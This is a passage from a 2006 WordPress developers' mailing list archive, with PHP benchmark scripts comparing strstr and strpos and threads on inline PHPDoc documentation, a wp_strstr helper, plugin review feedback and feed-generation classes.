	strstr($haystack, 'mplest');
}
$end = microtime(true);
printf("strstr at mid point run time: %.5f\n", $end - $start);

$start = microtime(true);
for($i = 0; $i < 10000; $i++) {
	strpos($haystack, 'mplest');
}
$end = microtime(true);
printf("strpos at mid point run time: %.5f\n", $end - $start);

$start = microtime(true);
for($i = 0; $i < 10000; $i++) {
	strstr($complexhaystack, 'asimplestring');
}
$end = microtime(true);
printf("strstr difficult match: %.5f\n", $end - $start);

$start = microtime(true);
for($i = 0; $i < 10000; $i++) {
	strpos($complexhaystack, 'asimplestring');
}
$end = microtime(true);
printf("strpos difficult match: %.5f\n", $end - $start);

$start = microtime(true);
for($i = 0; $i < 10000; $i++) {
	strstr($complexhaystack, 'asimplettring');
}
$end = microtime(true);
printf("strstr fail: %.5f\n", $end - $start);

$start = microtime(true);
for($i = 0; $i < 10000; $i++) {
	strpos($complexhaystack, 'asimplettring');
}
$end = microtime(true);
printf("strpos fail: %.5f\n", $end - $start);



?>
-------------- next part --------------
<?php
$haystack = 'asimplestring';
$complexhaystack = 'aasasiasimpasimplasimpleasimplestngasimplebringasimplestring';

for($i = 0; $i < 10000; $i++) {
	strstr($haystack, 'asimple');
}

for($i = 0; $i < 10000; $i++) {
	strstr($haystack, 'mplest');
}

for($i = 0; $i < 10000; $i++) {
	strstr($complexhaystack, 'asimplestring');
}

for($i = 0; $i < 10000; $i++) {
	strstr($complexhaystack, 'asimplettring');
}
?>
-------------- next part --------------
<?php
$haystack = 'asimplestring';
$complexhaystack = 'aasasiasimpasimplasimpleasimplestngasimplebringasimplestring';

for($i = 0; $i < 10000; $i++) {
	strpos($haystack, 'asimple');
}

for($i = 0; $i < 10000; $i++) {
	strpos($haystack, 'mplest');
}

for($i = 0; $i < 10000; $i++) {
	strpos($complexhaystack, 'asimplestring');
}

for($i = 0; $i < 10000; $i++) {
	strpos($complexhaystack, 'asimplettring');
}
?>
From false.hopes at gmail.com  Wed Feb 15 22:12:42 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Wed Feb 15 22:14:29 2006
Subject: [wp-hackers] PHP Coding Practices
In-Reply-To: <a491f91d0602151407k28e93054rb830980f2db563e1@mail.gmail.com>
References: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
	<7235C637-F6D4-4EB0-9A7D-905F5A79D797@txfx.net>
	<9b1b9dab0602151021j166e09fu5487b64940f330ca@mail.gmail.com>
	<a491f91d0602151407k28e93054rb830980f2db563e1@mail.gmail.com>
Message-ID: <a491f91d0602151412g34690a29s563518a27532d20c@mail.gmail.com>

Erm, that last email was meant as a reply to Mark.

--
--Robert Deaton
http://somethingunpredictable.com
From grijalva at gmail.com  Wed Feb 15 22:41:54 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Wed Feb 15 22:43:46 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <20060215195157.6xn97h3o5e0ww4k0@banana.catalyst2.com>
References: <43F33C8D.2010509@rcbowen.com>
	<80f75db0602150853o510486b3p4ea2aaa2558a1c90@mail.gmail.com>
	<5aa3aa0602150901y1317ec46n5e0e23e22bac9013@mail.gmail.com>
	<43F373EB.7000505@atl.lmco.com>
	<20060215191953.kkqygfrxmunkos40@banana.catalyst2.com>
	<43F3805C.2060305@skippy.net>
	<20060215195157.6xn97h3o5e0ww4k0@banana.catalyst2.com>
Message-ID: <a0159cd30602151441q4a47e578q152d5954858f79b7@mail.gmail.com>

I totally agree here.  For both comments and debugging code.  By stripping
them from the release version, there is zero extra overhead for the end user
while still providing very worthwhile tools to the developers.  Many good
IDEs for compiled languages have supported this for quite some time.  XCode,
for example, supports multiple build profiles for development vs
distribution and allows the developer to leave large quantities of debug
code in the source, while stripping it automatically at compile time.

Also, it should be noted that the Zend engine tends to be very efficient at
removing comments and extra whitespace.  So even if some comments do get
left in, the overhead cost is minimal.

-dave

On 2/15/06, Roy Schestowitz <r@schestowitz.com> wrote:
>
> _____/ On Wed 15 Feb 2006 19:26:20 GMT, [Scott Merrill] wrote : \_____
>
> > Roy Schestowitz wrote:
> >> Comment ought to be accumulated and always remain in tact in the
> >> repository.
> >> Each time release milestone is reached, run a parser which strips all
> >> comments and publish.
> >>
> >> Developers can fetch documented code of interest from the SVN
> repository,
> >> the nightly, or a Developer Edition. It is worth using the same tactic
> with
> >> debugging bits in the code. If there are none, something in development
> >> model is probably missed.
> >
> > I _strongly_ disagree with this approach.  A lot of people have learned
> > PHP by fiddling with WordPress.  I've personally encouraged a handful of
> > people to do so.  I think WordPress should be making an effort to
> > _encourage_ people to work through the code whenever they have an
> > interest in doing so.  Comments are a good way to help a new developer
> > learn the internals.
> >
> > Requiring them to fetch the "development source" seems like a gigantic
> > waste of time, and a real disservice.
>
> I respect your point-of-view on this. I /would/, however, like to raise
> the
> issue of debugging, which is equally important, yet has been clearly
> neglected. When used excessively, much like comments (in the context of
> code), it slows down the program, but I its potential is currently missed
> entirely. As some toy pseudo-code:
>
> % BEGIN DEBUG
>
>   % exception handling, long list of pre- and post-conditions
>
> if world<>same
>    report using TCP
> else
>    spew out "Hello World"
> emd
>
> % END DEBUG
>
> You can automatically remove such padded bits. Better yet, let wp-testers
> run such code and echo exceptions to Trac, or send them directly to a
> server (i.e. 'call back home').
>
> It is harmless if one remembers to remove debugging code  at the end
> (suitable text editors will fold DEBUG or syntax-highlight it using dim
> colours). Otherwise, as in the case of OpenOffice and Office benchmarks,
> someone could compare a program which is heavily loaded with 'junk'
> against
> a finalised release.
>
> Roy
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From wp at ebroder.net  Wed Feb 15 23:12:51 2006
From: wp at ebroder.net (Evan Broder)
Date: Wed Feb 15 23:14:16 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <a0159cd30602151441q4a47e578q152d5954858f79b7@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>	<80f75db0602150853o510486b3p4ea2aaa2558a1c90@mail.gmail.com>	<5aa3aa0602150901y1317ec46n5e0e23e22bac9013@mail.gmail.com>	<43F373EB.7000505@atl.lmco.com>	<20060215191953.kkqygfrxmunkos40@banana.catalyst2.com>	<43F3805C.2060305@skippy.net>	<20060215195157.6xn97h3o5e0ww4k0@banana.catalyst2.com>
	<a0159cd30602151441q4a47e578q152d5954858f79b7@mail.gmail.com>
Message-ID: <43F3B573.7010005@ebroder.net>

Dave Grijalva wrote:
> I totally agree here.  For both comments and debugging code.  By stripping
> them from the release version, there is zero extra overhead for the end user
> while still providing very worthwhile tools to the developers.  Many good
> IDEs for compiled languages have supported this for quite some time.  XCode,
> for example, supports multiple build profiles for development vs
> distribution and allows the developer to leave large quantities of debug
> code in the source, while stripping it automatically at compile time.
>   
But I think the point others were making is that WP is good for people 
who want to begin learning to develop. I would expect that the usual 
scenario is someone who has been using WP for a while and wants to write 
a plugin or something. They wouldn't have expected to need the 
development/commented version, so they wouldn't have it.

Also, there's an undeniable elegance in the one download only solution 
we've got going right now.
> Also, it should be noted that the Zend engine tends to be very efficient at
> removing comments and extra whitespace.  So even if some comments do get
> left in, the overhead cost is minimal.
>   
Agreed there. I think we should just release one version that's well 
commented. As it stands, the WP code can be a royal pain to try and 
decode---some comments would do it good.

- Evan
From grijalva at gmail.com  Wed Feb 15 23:20:52 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Wed Feb 15 23:22:41 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F3B573.7010005@ebroder.net>
References: <43F33C8D.2010509@rcbowen.com>
	<80f75db0602150853o510486b3p4ea2aaa2558a1c90@mail.gmail.com>
	<5aa3aa0602150901y1317ec46n5e0e23e22bac9013@mail.gmail.com>
	<43F373EB.7000505@atl.lmco.com>
	<20060215191953.kkqygfrxmunkos40@banana.catalyst2.com>
	<43F3805C.2060305@skippy.net>
	<20060215195157.6xn97h3o5e0ww4k0@banana.catalyst2.com>
	<a0159cd30602151441q4a47e578q152d5954858f79b7@mail.gmail.com>
	<43F3B573.7010005@ebroder.net>
Message-ID: <a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>

A possible solution, I think someone mentioned this earlier, would be to
keep inline documentation in the svn version, and strip it from the source
when preparing a release version.

-dave

On 2/15/06, Evan Broder <wp@ebroder.net> wrote:
>
> Dave Grijalva wrote:
> > I totally agree here.  For both comments and debugging code.  By
> stripping
> > them from the release version, there is zero extra overhead for the end
> user
> > while still providing very worthwhile tools to the developers.  Many
> good
> > IDEs for compiled languages have supported this for quite some
> time.  XCode,
> > for example, supports multiple build profiles for development vs
> > distribution and allows the developer to leave large quantities of debug
> > code in the source, while stripping it automatically at compile time.
> >
> But I think the point others were making is that WP is good for people
> who want to begin learning to develop. I would expect that the usual
> scenario is someone who has been using WP for a while and wants to write
> a plugin or something. They wouldn't have expected to need the
> development/commented version, so they wouldn't have it.
>
> Also, there's an undeniable elegance in the one download only solution
> we've got going right now.
> > Also, it should be noted that the Zend engine tends to be very efficient
> at
> > removing comments and extra whitespace.  So even if some comments do get
> > left in, the overhead cost is minimal.
> >
> Agreed there. I think we should just release one version that's well
> commented. As it stands, the WP code can be a royal pain to try and
> decode---some comments would do it good.
>
> - Evan
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From dmhouse at gmail.com  Wed Feb 15 23:26:25 2006
From: dmhouse at gmail.com (David House)
Date: Wed Feb 15 23:28:13 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<80f75db0602150853o510486b3p4ea2aaa2558a1c90@mail.gmail.com>
	<5aa3aa0602150901y1317ec46n5e0e23e22bac9013@mail.gmail.com>
	<43F373EB.7000505@atl.lmco.com>
	<20060215191953.kkqygfrxmunkos40@banana.catalyst2.com>
	<43F3805C.2060305@skippy.net>
	<20060215195157.6xn97h3o5e0ww4k0@banana.catalyst2.com>
	<a0159cd30602151441q4a47e578q152d5954858f79b7@mail.gmail.com>
	<43F3B573.7010005@ebroder.net>
	<a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>
Message-ID: <ebe43d680602151526i78f3cec7m@mail.gmail.com>

On 15/02/06, Dave Grijalva <grijalva@gmail.com> wrote:
> A possible solution, I think someone mentioned this earlier, would be to
> keep inline documentation in the svn version, and strip it from the source
> when preparing a release version.

Why? What single reason could there possibly be to strip comments
before realease? Overhead is negligible, as already noted.

Lets just have _one_ release of WP.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From grijalva at gmail.com  Wed Feb 15 23:46:13 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Wed Feb 15 23:47:59 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <ebe43d680602151526i78f3cec7m@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<5aa3aa0602150901y1317ec46n5e0e23e22bac9013@mail.gmail.com>
	<43F373EB.7000505@atl.lmco.com>
	<20060215191953.kkqygfrxmunkos40@banana.catalyst2.com>
	<43F3805C.2060305@skippy.net>
	<20060215195157.6xn97h3o5e0ww4k0@banana.catalyst2.com>
	<a0159cd30602151441q4a47e578q152d5954858f79b7@mail.gmail.com>
	<43F3B573.7010005@ebroder.net>
	<a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>
	<ebe43d680602151526i78f3cec7m@mail.gmail.com>
Message-ID: <a0159cd30602151546t66d59676ue847f66c9c3ffd75@mail.gmail.com>

fine by me.

On 2/15/06, David House <dmhouse@gmail.com> wrote:
>
> On 15/02/06, Dave Grijalva <grijalva@gmail.com> wrote:
> > A possible solution, I think someone mentioned this earlier, would be to
> > keep inline documentation in the svn version, and strip it from the
> source
> > when preparing a release version.
>
> Why? What single reason could there possibly be to strip comments
> before realease? Overhead is negligible, as already noted.
>
> Lets just have _one_ release of WP.
>
> --
> -David House, dmhouse@gmail.com, http://xmouse.ithium.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From wphackers at jamietalbot.com  Wed Feb 15 23:49:41 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Wed Feb 15 23:51:36 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <8C870449-B218-4BEC-A628-AF039CBF397D@alexking.org>
References: <a0159cd30602130122o50958aa9tcf9606dd808a7e7f@mail.gmail.com>	<43F08328.9050900@jamietalbot.com>	<43F09120.1000907@midnightcircus.com>	<43F09414.5010707@jamietalbot.com>	<43F32336.6080202@jamietalbot.com>
	<8C870449-B218-4BEC-A628-AF039CBF397D@alexking.org>
Message-ID: <43F3BE15.7070401@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Alex King wrote:
> Why re-invent the wheel then there is already FeedCreator out there
> (which would give us support for more formats to boot)?
> 
> Cheers,
> --Alex

Yeah, I hadn't looked at FeedCreator when I put together the WPFeed class, but they are similar.
Unfortunately, it would seem that getting FeedCreator into shape with WordPress would require
significant changes, removing lots of unnecessary code and replacing it with WordPress calls, which
wouldn't be beneficial to the FeedCreator project.  You'd end up hacking it so much that you'd lose
the benefit of using an existing class for reliability and proven-ness.  It also seems to miss out
some elements that are in the WordPress feeds (though of course they could just be added).  Finally,
it isn't extensible at all, in the sense that supported feed types are hard coded with a switch
statement - limiting the benefits of what an OOP solution can do.  Runtime binding to a variable
class using PHP's ability to do 'new $mything ()' is a much more elegant solution.

Anyway, I know this isn't such a popular idea, so I'm going to leave it, but I still think a
class-based solution, even if it isn't my suggestion, is the way to go.  I think DOM generating
would be best, now that I actually understand what Owen originally suggested.  The current situation
though, in my opinion, is not ideal.

Cheers,

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD874VrovxfShShFARAn9AAJ4tAowU4Q6aCbUET6V0wNJmxf0KOgCfbKBH
6g3iV2ZI1jFr2oyF497DY7Q=
=Ww/S
-----END PGP SIGNATURE-----
From nuclearmoose at gmail.com  Thu Feb 16 00:50:23 2006
From: nuclearmoose at gmail.com (Craig)
Date: Thu Feb 16 00:52:09 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <a0159cd30602151546t66d59676ue847f66c9c3ffd75@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com> <43F373EB.7000505@atl.lmco.com>
	<20060215191953.kkqygfrxmunkos40@banana.catalyst2.com>
	<43F3805C.2060305@skippy.net>
	<20060215195157.6xn97h3o5e0ww4k0@banana.catalyst2.com>
	<a0159cd30602151441q4a47e578q152d5954858f79b7@mail.gmail.com>
	<43F3B573.7010005@ebroder.net>
	<a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>
	<ebe43d680602151526i78f3cec7m@mail.gmail.com>
	<a0159cd30602151546t66d59676ue847f66c9c3ffd75@mail.gmail.com>
Message-ID: <5aa3aa0602151650p7d4bc2c2h966ea4931a90a11b@mail.gmail.com>

Okay, so where does this leave us? Do we not need someone's "approval" to do
something like this? Is there anyone around willing to lead the charge on
such an initiative? I'm certainly willing to assist, but it would have to be
more of a make-the-comments-look-pretty-etc function as I am in no position
to actually document something.

Buhler? Buhler? Buhler?

Craig.
From wp at ebroder.net  Thu Feb 16 00:59:09 2006
From: wp at ebroder.net (Evan Broder)
Date: Thu Feb 16 01:00:27 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <5aa3aa0602151650p7d4bc2c2h966ea4931a90a11b@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<43F373EB.7000505@atl.lmco.com>	<20060215191953.kkqygfrxmunkos40@banana.catalyst2.com>	<43F3805C.2060305@skippy.net>	<20060215195157.6xn97h3o5e0ww4k0@banana.catalyst2.com>	<a0159cd30602151441q4a47e578q152d5954858f79b7@mail.gmail.com>	<43F3B573.7010005@ebroder.net>	<a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>	<ebe43d680602151526i78f3cec7m@mail.gmail.com>	<a0159cd30602151546t66d59676ue847f66c9c3ffd75@mail.gmail.com>
	<5aa3aa0602151650p7d4bc2c2h966ea4931a90a11b@mail.gmail.com>
Message-ID: <43F3CE5D.7080907@ebroder.net>

Craig wrote:
> Okay, so where does this leave us? Do we not need someone's "approval" to do
> something like this? Is there anyone around willing to lead the charge on
> such an initiative? I'm certainly willing to assist, but it would have to be
> more of a make-the-comments-look-pretty-etc function as I am in no position
> to actually document something.
>
> Buhler? Buhler? Buhler?
>   
Another thought: it would make sense to use formatting that could be 
extracted with doxygen or whatever equivalent there is for PHP. That 
way, we could go create webpages with searchable documentation on all of 
the functions. I know that when I'm trying to trace a problem through 
the core, it's always a pain to find all of the various functions in the 
source.
From mark.wordpress at txfx.net  Thu Feb 16 01:11:20 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Thu Feb 16 01:13:10 2006
Subject: [wp-hackers] PHP Coding Practices
In-Reply-To: <a491f91d0602151407k28e93054rb830980f2db563e1@mail.gmail.com>
References: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
	<7235C637-F6D4-4EB0-9A7D-905F5A79D797@txfx.net>
	<9b1b9dab0602151021j166e09fu5487b64940f330ca@mail.gmail.com>
	<a491f91d0602151407k28e93054rb830980f2db563e1@mail.gmail.com>
Message-ID: <EB407EA8-10E2-46D5-98A4-A5D867248968@txfx.net>

On Feb 15, 2006, at 5:07 PM, Robert Deaton wrote:

> Your tests are not near detailed or run enough times to be a true
> indication. Here's something I threw together that might be a more
> accurate test, that tries not only real time, but cpu time as well,
> because both are very important to us, we need to keep server load
> down.

You're right, my tests were simplistic.

Replacing the existing strstr() instances with strpos() would have to  
be done manually... or with several regexes (that might mess things  
up).  But what would be easy is to replace all instances of "strstr("  
with "wp_strstr(".  We could then make something like:

function wp_strstr($haystack, $needle) {
	if ( strpos($haystack, $needle) !== false )
		return true;
	return false;
}

Would passing it through a function like that erode too much of the  
benefit that strpos() offers?  I like this approach, because strpos 
($haystack, $needle) !== false is ugly... and is prone to error (if  
someone accidentally uses !=, or just checks boolean true/false).   
wp_strstr($haystack, $needle) is much  easier to read and to code.   
And I easily made that change project wide with a simple search/replace.

Can you run your test between strstr() and wp_strstr() and see if it  
is still worth doing?
--
Mark Jaquith
http://txfx.net/


From ringmaster at midnightcircus.com  Thu Feb 16 01:19:03 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Thu Feb 16 01:21:10 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F3CE5D.7080907@ebroder.net>
References: <43F33C8D.2010509@rcbowen.com>	<43F373EB.7000505@atl.lmco.com>
	<20060215191953.kkqygfrxmunkos40@banana.catalyst2.com>
	<43F3805C.2060305@skippy.net>
	<20060215195157.6xn97h3o5e0ww4k0@banana.catalyst2.com>
	<a0159cd30602151441q4a47e578q152d5954858f79b7@mail.gmail.com>
	<43F3B573.7010005@ebroder.net>
	<a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>
	<ebe43d680602151526i78f3cec7m@mail.gmail.com>
	<a0159cd30602151546t66d59676ue847f66c9c3ffd75@mail.gmail.com>
	<5aa3aa0602151650p7d4bc2c2h966ea4931a90a11b@mail.gmail.com>
	<43F3CE5D.7080907@ebroder.net>
Message-ID: <43F3D307.6040009@midnightcircus.com>

Evan Broder wrote:
> Another thought: it would make sense to use formatting that could be 
> extracted with doxygen or whatever equivalent there is for PHP. That 
> way, we could go create webpages with searchable documentation on all of 
> the functions. I know that when I'm trying to trace a problem through 
> the core, it's always a pain to find all of the various functions in the 
> source.

PHPDoc is reasonably well supported, and both PHP Documentor and PHPXref 
can extract documentation in that format.

I keep a copy of Xref output at http://redalt.com/xref updated from SVN 
twice daily (as do a couple of other folks).  If PHPDoc comments found 
their way into the source, they would appear instantly whenever the Xref 
is regenerated.

More info is available on PHP Documentor at http://www.phpdoc.org/

A copy of Xref docs for Xaraya are at 
http://phpxref.sourceforge.net/phpxref-xaraya/nav.html.gz?index.html.gz 
in case anyone wants to see what PHPDoc looks like and how it appears 
after it's parsed by PHPXref.

Owen
From grijalva at gmail.com  Thu Feb 16 01:25:52 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Thu Feb 16 01:27:38 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F3D307.6040009@midnightcircus.com>
References: <43F33C8D.2010509@rcbowen.com>
	<20060215195157.6xn97h3o5e0ww4k0@banana.catalyst2.com>
	<a0159cd30602151441q4a47e578q152d5954858f79b7@mail.gmail.com>
	<43F3B573.7010005@ebroder.net>
	<a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>
	<ebe43d680602151526i78f3cec7m@mail.gmail.com>
	<a0159cd30602151546t66d59676ue847f66c9c3ffd75@mail.gmail.com>
	<5aa3aa0602151650p7d4bc2c2h966ea4931a90a11b@mail.gmail.com>
	<43F3CE5D.7080907@ebroder.net> <43F3D307.6040009@midnightcircus.com>
Message-ID: <a0159cd30602151725tfadd994rb32de5eb9fd8b56b@mail.gmail.com>

I agree.  PHPDoc is probably the way to go.  It's a pretty common format,
many C/Java developers will be used to it.  Also, many editors, such as ZDE
already have support for that documentation format.

-dave

On 2/15/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
>
> Evan Broder wrote:
> > Another thought: it would make sense to use formatting that could be
> > extracted with doxygen or whatever equivalent there is for PHP. That
> > way, we could go create webpages with searchable documentation on all of
> > the functions. I know that when I'm trying to trace a problem through
> > the core, it's always a pain to find all of the various functions in the
> > source.
>
> PHPDoc is reasonably well supported, and both PHP Documentor and PHPXref
> can extract documentation in that format.
>
> I keep a copy of Xref output at http://redalt.com/xref updated from SVN
> twice daily (as do a couple of other folks).  If PHPDoc comments found
> their way into the source, they would appear instantly whenever the Xref
> is regenerated.
>
> More info is available on PHP Documentor at http://www.phpdoc.org/
>
> A copy of Xref docs for Xaraya are at
> http://phpxref.sourceforge.net/phpxref-xaraya/nav.html.gz?index.html.gz
> in case anyone wants to see what PHPDoc looks like and how it appears
> after it's parsed by PHPXref.
>
> Owen
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From grijalva at gmail.com  Thu Feb 16 01:43:02 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Thu Feb 16 01:44:52 2006
Subject: [wp-hackers] Looking for input
Message-ID: <a0159cd30602151743v6f7fa842k580c0aa08a6e2577@mail.gmail.com>

I don't know if this is the right place to ask this, but I've been working
on a wordpress plugin and I'm looking for some testers/feedback from other
wp hackers.  Anyway, the url is
http://theblogthatnoonereads.tunasoft.com/coralize/ .  If this is the wrong
place to be asking about this, please let me know.
From mark.wordpress at txfx.net  Thu Feb 16 02:02:46 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Thu Feb 16 02:04:36 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F3D307.6040009@midnightcircus.com>
References: <43F33C8D.2010509@rcbowen.com>	<43F373EB.7000505@atl.lmco.com>
	<20060215191953.kkqygfrxmunkos40@banana.catalyst2.com>
	<43F3805C.2060305@skippy.net>
	<20060215195157.6xn97h3o5e0ww4k0@banana.catalyst2.com>
	<a0159cd30602151441q4a47e578q152d5954858f79b7@mail.gmail.com>
	<43F3B573.7010005@ebroder.net>
	<a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>
	<ebe43d680602151526i78f3cec7m@mail.gmail.com>
	<a0159cd30602151546t66d59676ue847f66c9c3ffd75@mail.gmail.com>
	<5aa3aa0602151650p7d4bc2c2h966ea4931a90a11b@mail.gmail.com>
	<43F3CE5D.7080907@ebroder.net>
	<43F3D307.6040009@midnightcircus.com>
Message-ID: <B276AEA0-C2DB-49A0-9B45-AB50AA13991B@txfx.net>

On Feb 15, 2006, at 8:19 PM, Owen Winkler wrote:

> PHPDoc is reasonably well supported, and both PHP Documentor and  
> PHPXref can extract documentation in that format.

Sounds good to me.  Best thing to do would be for people to take a wp- 
includes file and do the documentation for it.  You could submit a  
ticket in trac like "PHPDoc: /wp-includes/functions.php" and then  
post a comment saying that you're working on it... that way we're not  
stepping on each other's toes.

This can be an incremental thing... one file at time.
--
Mark Jaquith
http://txfx.net/


From carthik at gmail.com  Thu Feb 16 04:05:02 2006
From: carthik at gmail.com (Carthik Sharma)
Date: Thu Feb 16 04:06:50 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <B276AEA0-C2DB-49A0-9B45-AB50AA13991B@txfx.net>
References: <43F33C8D.2010509@rcbowen.com>
	<a0159cd30602151441q4a47e578q152d5954858f79b7@mail.gmail.com>
	<43F3B573.7010005@ebroder.net>
	<a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>
	<ebe43d680602151526i78f3cec7m@mail.gmail.com>
	<a0159cd30602151546t66d59676ue847f66c9c3ffd75@mail.gmail.com>
	<5aa3aa0602151650p7d4bc2c2h966ea4931a90a11b@mail.gmail.com>
	<43F3CE5D.7080907@ebroder.net> <43F3D307.6040009@midnightcircus.com>
	<B276AEA0-C2DB-49A0-9B45-AB50AA13991B@txfx.net>
Message-ID: <80f75db0602152005n2bff779ej875afbd4557731e0@mail.gmail.com>

On 2/15/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
> On Feb 15, 2006, at 8:19 PM, Owen Winkler wrote:
>
> > PHPDoc is reasonably well supported, and both PHP Documentor and
> > PHPXref can extract documentation in that format.
>
> Sounds good to me.  Best thing to do would be for people to take a wp-
> includes file and do the documentation for it.  You could submit a
> ticket in trac like "PHPDoc: /wp-includes/functions.php" and then
> post a comment saying that you're working on it... that way we're not
> stepping on each other's toes.
>
> This can be an incremental thing... one file at time.

Finally, we get going - great!

Two points:

Point 1:
If I were active, I would write up a quickie howto, or guidelines to
be followed to ensure standardization.
Could we do one on the wp-includes/ files perhaps, agree on
format/content to the included and  then proceed with the rest? I
suppose, otherwise, this will lead to many tickets on trac,
complaining about incorrect documentation. That, besides the fact that
otherwise the documentation will be non-uniform.

Point 2:
I would suggest working on a seperate copy of the code repository -
probably the last stable version (2.0.1) until this work is finished.
The reason being, it would be nice, for once, to actually make USE of
version control by opening things up to more than 2-3 people, get the
work done fast, and then merge back the changes when the documentation
is mature enough.

Regards,
Carthik
--
Ph.D. Candidate
University of Central Florida
Homepage: http://carthik.net
From sam at rephrase.net  Thu Feb 16 04:34:34 2006
From: sam at rephrase.net (Sam Angove)
Date: Thu Feb 16 04:36:30 2006
Subject: [wp-hackers] Looking for input
In-Reply-To: <a0159cd30602151743v6f7fa842k580c0aa08a6e2577@mail.gmail.com>
References: <a0159cd30602151743v6f7fa842k580c0aa08a6e2577@mail.gmail.com>
Message-ID: <aa74b1910602152034k25945336lf9b7c5b87615d36d@mail.gmail.com>

On 2/16/06, Dave Grijalva <grijalva@gmail.com> wrote:
> I don't know if this is the right place to ask this, but I've been working
> on a wordpress plugin and I'm looking for some testers/feedback from other
> wp hackers.  Anyway, the url is
> http://theblogthatnoonereads.tunasoft.com/coralize/

That looks like a great plugin. A few things from browsing the source:

* `wp_head` is a really bad hook to put `coralize_site()` on, since
it's theme-dependent and called very late. Maybe `plugins_loaded` or
`init`.

* For the blacklist regex, you can use negative lookahead. Something like:

    (<img\s+.*?src="http://(?!(example.com|example.net)).*?)(/.*?".*?>)

* Single quotes are also valid for HTML attributes, but the plugin
only matches double quotes.

* Is there some reason I don't see to use `coralize_preg_domain()`
instead of PHP's `preg_quote()`?

* Just for general readability, you don't need to backslash-escape
nearly so much in the regular expressions, especially if you use
something other than forward-slash as the delimiter.

:)
From mark.wordpress at txfx.net  Thu Feb 16 04:47:07 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Thu Feb 16 04:49:09 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <80f75db0602152005n2bff779ej875afbd4557731e0@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<a0159cd30602151441q4a47e578q152d5954858f79b7@mail.gmail.com>
	<43F3B573.7010005@ebroder.net>
	<a0159cd30602151520y69d4a32di6c0e8e92fffaa82@mail.gmail.com>
	<ebe43d680602151526i78f3cec7m@mail.gmail.com>
	<a0159cd30602151546t66d59676ue847f66c9c3ffd75@mail.gmail.com>
	<5aa3aa0602151650p7d4bc2c2h966ea4931a90a11b@mail.gmail.com>
	<43F3CE5D.7080907@ebroder.net>
	<43F3D307.6040009@midnightcircus.com>
	<B276AEA0-C2DB-49A0-9B45-AB50AA13991B@txfx.net>
	<80f75db0602152005n2bff779ej875afbd4557731e0@mail.gmail.com>
Message-ID: <A01D8E33-EE0A-454E-8D88-921CE9E5FB7E@txfx.net>

On Feb 15, 2006, at 11:05 PM, Carthik Sharma wrote:

> Point 1:
> If I were active, I would write up a quickie howto, or guidelines to
> be followed to ensure standardization.
> Could we do one on the wp-includes/ files perhaps, agree on
> format/content to the included and  then proceed with the rest? I
> suppose, otherwise, this will lead to many tickets on trac,
> complaining about incorrect documentation. That, besides the fact that
> otherwise the documentation will be non-uniform.

I'm looking into this, and found this:

http://www.phpdoc.de/doc/introduction.html
>     *  one class per file
>     * eigther procedural or OO code in one file

That would require changes in some WP files.  Now, this is just a  
note about the PHPDoc "parser" (really, just a bunch of greps)... it  
may be that PHPXref has a real parse and could handle multiple  
classes per file and OO/non-OO code mixes like we have throughout WP.

>
> Point 2:
> I would suggest working on a seperate copy of the code repository -
